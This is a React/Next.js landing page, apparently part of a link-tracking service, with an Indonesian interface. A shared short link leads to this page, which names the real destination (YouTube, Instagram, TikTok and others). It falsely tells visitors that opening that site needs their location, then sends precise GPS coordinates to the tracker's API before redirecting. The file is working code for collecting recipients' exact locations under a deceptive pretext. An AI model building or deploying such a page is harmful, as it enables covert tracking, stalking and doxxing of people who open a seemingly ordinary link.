"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";

type Phase = "loading" | "asking" | "locating" | "done" | "denied" | "error";

export default function TrackerLandingPage() {
  const params = useParams();
  const code = params.code as string;

  const [phase, setPhase] = useState<Phase>("loading");
  const [targetUrl, setTargetUrl] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(3);

  // Fetch target URL first
  useEffect(() => {
    if (!code) return;
    fetch(`/api/t-info/${code}`)
      .then((r) => r.json())
      .then((d) => {
        if (d.target_url) {
          setTargetUrl(d.target_url);
          setPhase("asking");
        } else {
          setPhase("error");
        }
      })
      .catch(() => setPhase("error"));
  }, [code]);

  // Countdown to redirect after GPS done/denied
  useEffect(() => {
    if (phase !== "done" && phase !== "denied") return;
    if (countdown === 0 && targetUrl) {
      window.location.href = targetUrl;
      return;
    }
    const t = setTimeout(() => setCountdown((c) => c - 1), 1000);
    return () => clearTimeout(t);
  }, [phase, countdown, targetUrl]);

  function handleAllow() {
    setPhase("locating");
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // Send GPS data to our API
        await fetch(`/api/t-geo/${code}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            gps_latitude: pos.coords.latitude,
            gps_longitude: pos.coords.longitude,
            gps_accuracy: pos.coords.accuracy,
          }),
        }).catch(() => {});
        setPhase("done");
      },
      () => {
        // Permission denied or error — still redirect, just no GPS
        setPhase("denied");
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }

  function handleDeny() {
    setPhase("denied");
  }

  // Detect what domain the target is to show a familiar logo-ish hint
  function getDomainLabel(url: string) {
    try {
      const h = new URL(url).hostname.replace("www.", "");
      if (h.includes("youtube") || h.includes("youtu.be")) return "YouTube";
      if (h.includes("instagram")) return "Instagram";
      if (h.includes("tiktok")) return "TikTok";
      if (h.includes("twitter") || h.includes("x.com")) return "X (Twitter)";
      if (h.includes("facebook") || h.includes("fb.com")) return "Facebook";
      return h;
    } catch {
      return "halaman tujuan";
    }
  }

  const label = targetUrl ? getDomainLabel(targetUrl) : "";

  return (
    <div className="min-h-screen bg-navy-950 flex items-center justify-center px-4">
      <div className="w-full max-w-sm">

        {/* Loading */}
        {phase === "loading" && (
          <div className="text-center">
            <div className="w-12 h-12 border-2 border-sky-400/30 border-t-sky-400 rounded-full animate-spin mx-auto mb-4" />
            <p className="text-slate-500 text-sm">Memuat…</p>
          </div>
        )}

        {/* Asking permission */}
        {phase === "asking" && (
          <div className="rounded-2xl border border-white/8 bg-navy-800/60 backdrop-blur-sm p-7 text-center">
            {/* Icon */}
            <div className="w-16 h-16 rounded-2xl bg-sky-400/10 border border-sky-400/20 flex items-center justify-center mx-auto mb-5">
              <svg className="w-8 h-8 text-sky-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5}
                  d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5}
                  d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z" />
              </svg>
            </div>

            <h1 className="text-white font-display font-bold text-lg mb-1">
              Aktifkan Lokasi
            </h1>
            <p className="text-slate-400 text-sm mb-1">
              Untuk membuka <span className="text-sky-400 font-medium">{label}</span>,
              halaman ini meminta izin lokasi kamu.
            </p>
            <p className="text-slate-600 text-xs mb-6">
              Kamu akan diarahkan otomatis setelah mengizinkan.
            </p>

            <button
              onClick={handleAllow}
              className="w-full py-3 rounded-xl bg-sky-400 hover:bg-sky-300 text-navy-900 font-display font-semibold text-sm transition-all mb-2"
            >
              Izinkan &amp; Lanjutkan
            </button>
            <button
              onClick={handleDeny}
              className="w-full py-2.5 rounded-xl text-slate-500 hover:text-slate-400 text-sm transition-colors"
            >
              Lewati
            </button>
          </div>
        )}

        {/* Getting location */}
        {phase === "locating" && (
          <div className="text-center">
            <div className="w-16 h-16 rounded-2xl bg-sky-400/10 border border-sky-400/20 flex items-center justify-center mx-auto mb-5">
              <div className="w-6 h-6 border-2 border-sky-400/40 border-t-sky-400 rounded-full animate-spin" />
            </div>
            <p className="text-white font-medium mb-1">Mendapatkan lokasi…</p>
            <p className="text-slate-500 text-sm">Mohon tunggu sebentar</p>
          </div>
        )}

        {/* Done - GPS captured */}
        {phase === "done" && (
          <div className="rounded-2xl border border-emerald-400/20 bg-navy-800/60 p-7 text-center">
            <div className="w-16 h-16 rounded-2xl bg-emerald-400/10 border border-emerald-400/20 flex items-center justify-center mx-auto mb-5">
              <svg className="w-8 h-8 text-emerald-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <p className="text-white font-medium mb-1">Mengarahkan ke {label}…</p>
            <p className="text-slate-500 text-sm">dalam {countdown} detik</p>
          </div>
        )}

        {/* Denied - no GPS but still redirect */}
        {phase === "denied" && (
          <div className="rounded-2xl border border-white/8 bg-navy-800/60 p-7 text-center">
            <p className="text-white font-medium mb-1">Mengarahkan ke {label}…</p>
            <p className="text-slate-500 text-sm">dalam {countdown} detik</p>
          </div>
        )}

        {/* Error */}
        {phase === "error" && (
          <div className="text-center">
            <p className="text-rose-400 font-medium mb-1">Link tidak ditemukan</p>
            <p className="text-slate-500 text-sm">Link mungkin sudah expired atau salah.</p>
          </div>
        )}
      </div>
    </div>
  );
}
